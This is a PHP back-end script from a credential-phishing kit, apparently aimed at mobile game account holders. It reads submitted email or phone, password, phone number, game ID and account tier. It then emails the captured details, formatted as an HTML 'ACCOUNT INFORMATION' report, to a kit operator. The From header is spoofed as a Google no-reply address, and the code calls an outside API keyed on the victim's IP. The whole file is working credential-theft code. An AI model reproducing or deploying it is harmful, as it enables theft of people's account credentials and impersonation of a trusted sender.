<?php
extract($_POST);
if(isset($user)){
   $date = date('l, d-m-Y h:i:s');
   // Get Flag   
   $url = "http://api-xyz.com/system/flag/?ip=".$ip;

   $curl = curl_init($url);
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
   
   $exe = curl_exec($curl);
   curl_close($curl);

   $xyz = json_decode($exe,true);
   print_r($xyz);
   $subjek = '-=[ '.$xyz['code'].' '.$xyz['flag'].' | LVL '.$level.' | '.$nick.' ]=-';
   $pesan = '
   <center>
    <div style="background: url(https://i.ibb.co/LxbHbNp/61189c6182e9f.jpg) no-repeat;border:2px solid #c21500;border-bottom:none;background-size: 100% 100%; width: 100%; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
   </div>
   <div style="border:2px solid #c21500;border-bottom:none;width: 100%; font-weight:bold; height: 20px; background: linear-gradient(to right, #ec6f66, #f3a183); color: #fff; padding:8px 0; text-align:center;">
 ACCOUNT INFORMATION</div>
    <table border="1" bordercolor="#b993d6" style="color:#fff; border:2px solid #c21500; border-collapse:collapse;width:100%;background: linear-gradient(to right, #f2709c, #ff9472);">
       <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telepon</b></th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
   </tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nomor HP</th>
   <th style="width: 65%; text-align: center;"><b>'.$hp.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ID</th>
   <th style="width: 65%; text-align: center;"><b>'.$id.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nickname</th>
   <th style="width: 65%; text-align: center;"><b>'.$nick.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Elite Pass</th>
   <th style="width: 65%; text-align: center;"><b>'.$ep.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Tier</th>
   <th style="width: 65%; text-align: center;"><b>'.$tier.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date</th>
   <th style="width: 65%; text-align: center;"><b>'.$date.'</th> 
   </tr>
   </table>
   <div style="border:2px solid #c21500;border-top:none;border-bottom:none;width: 100%; font-weight:bold; height: 20px; background: linear-gradient(to right, #ec6f66, #f3a183); color: #fff; padding:8px 0; text-align:center;">
 USER INFORMATION</div>
   <table border="1" bordercolor="#b993d6" style="color:#fff; border:2px solid #c21500; border-collapse:collapse;width:100%;background: linear-gradient(to right, #f2709c, #ff9472);">
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Ip Address</b></th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$ip.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Country</b></th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$ip.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Device</b></th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$ip.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Operating System</b></th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$ip.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Browser</b></th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$ip.'</th> 
   </tr>
   </table>
   
   
   <div style="border:2px solid #c21500;border-top:none;width: 100%; font-weight:bold; height: 20px; background: linear-gradient(to right, #ec6f66, #f3a183); color: #fff; padding: 10px 0; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
     Follow Instagram : <a href="http://instagram.com/st.renzichwan">@st.renzichwan</a>
   </div>
    <center>
   ';
   include'email.php';
   $sender = 'From: Tihhh Ganz : @st.renzichwan<no-reply@accounts.google.com>';
   $headers  = 'MIME-Version: 1.0' . "\r\n";
   $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
   $headers .= ''.$sender.'' . "\r\n";
   // MENGIRIM DATA KE EMAIL
   mail($email, $subjek, $pesan, $headers);
}else{
header('location:index.html');
}
?>